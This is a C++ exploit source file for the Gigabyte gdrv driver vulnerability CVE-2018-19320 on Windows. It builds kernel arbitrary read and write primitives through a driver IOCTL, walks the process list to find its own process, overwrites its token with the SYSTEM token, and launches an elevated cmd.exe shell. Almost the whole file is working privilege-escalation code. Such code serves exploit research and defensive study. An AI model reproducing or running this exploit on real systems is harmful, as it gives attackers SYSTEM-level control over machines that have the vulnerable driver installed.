#include "Common.h"
#include "Exploits.h"

/*
   Gigabyte Driver CVE-2018-19320 / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   Data only attack. We do not execute shellcode and just replace our token.

   Debug: 
   ba e1 gdrv+0x312f (break on IOCTL 0xC3502488)
*/

namespace GigabyteDriverMINS {
	// vuln based read primitive
	QWORD arbRead(QWORD where, HANDLE hDriver, DWORD IOCTL) {	
		typedef struct _Memcpy {
			QWORD dest;
			QWORD src;
			DWORD size;
		} _Memcpy;

		LPVOID readBuffer = VirtualAlloc(NULL, 0x8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		_Memcpy memCpy = { (QWORD)readBuffer, where, 8 }; // copy where to readbuffer

		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&memCpy, sizeof(memCpy), NULL, 0, NULL, NULL)) {
			printf("[-] Error in arbRead (IOCTL)\n");
			exit(-1);
		}
		return *((QWORD*) readBuffer);
	}

	// vuln based write primitive
	VOID arbWrite(QWORD where, QWORD what, HANDLE hDriver, DWORD IOCTL) {
		typedef struct _Memcpy {
			QWORD dest;
			QWORD src;
			DWORD size;
		} _Memcpy;

		_Memcpy memCpy = { where , what, 8 }; // copy src to dst
		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&memCpy, sizeof(memCpy), NULL, 0, NULL, NULL)) {
			printf("[-] Error in arbWrite (IOCTL)\n");
			exit(-1);
		}
	}

	void Exploit(int argc, char** argv) {
		DWORD IoMemcpy = 0xC3502808;

		HANDLE hDriver = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// find system EPROCESS & token		
		QWORD systemProc = getSystemEProcess();
		printf("[*] System _EPROCESS: 0x%llx\n", systemProc);
		QWORD systemToken = arbRead(systemProc + 0x4b8, hDriver, IoMemcpy); // we do not really need this one, just for printing, the important one is ptr to it
		printf("[*] System TOKEN: 0x%llx\n", systemToken);

		// walk ActiveProcessLinks to find our process
		DWORD currentProcessPid = GetCurrentProcessId();
		printf("[*] Current Process PID %d\n", currentProcessPid);
		BOOL found = false;
		QWORD cProcess = systemProc;
		DWORD cPid = 0, cTokenPtr;
		while (!found) {
			cProcess = arbRead(cProcess + 0x448, hDriver, IoMemcpy); // get next entry in ActiveProcessLinks
			cProcess -= 0x448; // get back to start of _EPROCESS (otherwise it points directly to next entrys 0x448 offset)
			cPid = arbRead(cProcess + 0x440, hDriver, IoMemcpy);
			cTokenPtr = cProcess + 0x4b8;
			//printf("  [*] cProcess %llx (PID: %d, TOKEN_PTR: %d)\n", cProcess, cTokenPtr);
			if (cPid == currentProcessPid) {
				found = true;
				break;
			}
		}
		if (!found) {
			printf("[-] Could not find current process in ActiveProcessLinks\n");
			exit(-1);
		}

		printf("[>] Replacing Token\n");
		arbWrite(cProcess + 0x4b8, systemProc + 0x4b8, hDriver, IoMemcpy);

		printf("[>] Starting shell\n");
		system("cmd.exe");

		printf("[>] Cleaning up\n");
		arbWrite(cProcess + 0x4b8, cTokenPtr, hDriver, IoMemcpy);
	}
}


int GigabyteDriverMI(int argc, char** argv) {
	printf("[*] Running GigabyteDriver01\n");
	GigabyteDriverMINS::Exploit(argc, argv);
	return 0;
}